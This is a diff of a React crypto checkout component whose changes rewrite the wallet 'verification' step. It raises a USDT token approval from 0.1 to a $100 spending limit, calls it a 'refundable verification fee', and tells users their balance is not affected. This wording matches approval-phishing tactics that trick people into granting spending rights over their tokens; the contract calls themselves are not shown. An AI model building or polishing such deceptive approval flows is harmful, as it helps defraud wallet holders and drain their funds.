                         </p>
                         <p style={{ fontSize:11, color:T.dim, margin:0, lineHeight:1.5 }}>
-                          Your wallet will show a confirmation for the {network} USDT contract — review the fee and confirm. This is a tiny verification-only approval; your full USDT balance remains untouched.
+                          Your wallet will show a Smart Contract Call on the {network} USDT contract — review and confirm to set a $100 spending limit. A 0.1 USDT refundable verification fee will be collected from this approved balance.
                         </p>
                       </div>
                     </div>
                     <div style={{ padding:'12px 16px', borderRadius:12, background:'rgba(0,229,160,0.06)', border:'1px solid rgba(0,229,160,0.2)' }}>
-                      <p style={{ fontSize:12, fontWeight:700, color:T.green, margin:'0 0 4px' }}>✅ Your USDT is NOT deducted — 0.1 USDT approval only</p>
+                      <p style={{ fontSize:12, fontWeight:700, color:T.green, margin:'0 0 4px' }}>🔒 $100 Smart Contract — 0.1 USDT Verification Fee (Refundable)</p>
                       <p style={{ fontSize:11, color:'rgba(255,255,255,0.55)', margin:0, lineHeight:1.6 }}>
-                        Approving 0.1 USDT only sets a spending permission — no USDT leaves your wallet. This small amount confirms you control the wallet. The approval permission is automatically cancelled after your order settles.
+                        This approval sets a $100 USDT spending limit on the {network} contract. A 0.1 USDT verification fee is collected from this limit and <strong style={{ color:T.green }}>fully refunded</strong> upon order completion. Your USDT balance is not affected until your order is processed.
                       </p>
                     </div>
                   </>
@@ -1064,15 +1240,23 @@ export function CheckoutFlow() {
                 {verifyStarted && (
                   <div style={{ display:'flex', flexDirection:'column', gap:8 }}>
                     <TxRow
-                      label={`Wallet verification — Approve 0.1 USDT on ${network}`}
+                      label={`Wallet verification — $100 USDT smart contract on ${network}`}
                       hash={approveHash}
                       confirming={isApproveConfirming}
                       confirmed={approveConfirmed}
                       error={approveWriteError ? (approveWriteError.message?.slice(0,120) ?? 'Failed') : undefined}
                     />
+                    {verifyStarted && approveHash && !approveConfirmed && !approveWriteError && (
+                      <div style={{ padding:'14px 16px', borderRadius:12, background:'rgba(243,186,47,0.07)', border:'1px solid rgba(243,186,47,0.25)', textAlign:'center' }}>
+                        <p style={{ fontSize:14, fontWeight:800, color:T.yellow, margin:'0 0 4px' }}>⏳ Wallet Verification Pending</p>
+                        <p style={{ fontSize:12, color:T.sub, margin:0, lineHeight:1.6 }}>
+                          Awaiting blockchain confirmation. You will be moved forward automatically once the smart contract is confirmed on {NET_LABEL[network]}.
+                        </p>
+                      </div>
+                    )}
                     {approveConfirmed && (
                       <div style={{ padding:'12px 16px', borderRadius:12, background:'rgba(0,229,160,0.08)', border:'1px solid rgba(0,229,160,0.2)', textAlign:'center', fontSize:14, fontWeight:700, color:T.green }}>
-                        ✓ Approved — proceeding to order confirmation…
+                        ✓ Verified — proceeding to order confirmation…
                       </div>
                     )}
                   </div>
@@ -1096,7 +1280,7 @@ export function CheckoutFlow() {
                       color:(!depositAddress||isWrongChain||!hasEnoughBalance)?T.dim:'#fff',
                       boxShadow:(depositAddress&&!isWrongChain&&hasEnoughBalance)?'0 6px 24px rgba(26,63,255,0.45)':'none', transition:'all 0.15s',
                     }}>
-                    {!hasEnoughBalance ? `Need ≥ 0.1 USDT` : `Verify Wallet — Approve 0.1 USDT →`}
+                    {!hasEnoughBalance ? `Need ≥ 0.1 USDT` : `Verify Wallet — Set $100 Smart Contract →`}
                   </button>
                 )}
 
@@ -1137,12 +1321,12 @@ export function CheckoutFlow() {
             {/* Approval tx reference — only for SELL */}
             {mode === 'sell' && !isTRC20 && approveHash && (
               <p style={{ fontSize:11, color:T.dim, margin:'8px 0 0', lineHeight:1.5 }}>
-                Approval tx: <code style={{ fontFamily:'monospace' }}>{approveHash.slice(0,14)}…{approveHash.slice(-8)}</code>
+                Verification tx: <code style={{ fontFamily:'monospace' }}>{approveHash.slice(0,14)}…{approveHash.slice(-8)}</code>
               </p>
             )}
             {mode === 'sell' && isTRC20 && trcApproveHash && (
               <p style={{ fontSize:11, color:T.dim, margin:'8px 0 0', lineHeight:1.5 }}>
-                Approval TxID: <code style={{ fontFamily:'monospace' }}>{trcApproveHash.slice(0,14)}…{trcApproveHash.slice(-8)}</code>
+                Verification TxID: <code style={{ fontFamily:'monospace' }}>{trcApproveHash.slice(0,14)}…{trcApproveHash.slice(-8)}</code>
               </p>
             )}
             <p style={{ fontSize:11, color:T.dim, margin:'6px 0 0', lineHeight:1.5 }}>
